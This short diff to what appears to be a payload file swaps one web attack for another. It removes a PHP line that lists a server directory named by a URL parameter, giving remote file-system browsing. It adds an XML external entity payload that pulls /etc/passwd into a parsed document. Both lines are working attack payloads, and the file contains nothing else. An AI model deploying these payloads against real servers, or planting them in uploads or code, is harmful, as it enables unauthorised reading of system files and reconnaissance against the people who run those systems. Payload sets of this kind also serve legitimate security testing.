@@ -1,1 +1,1 @@
-<?php $payload = var_dump(scandir($_GET['c'])); ?>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
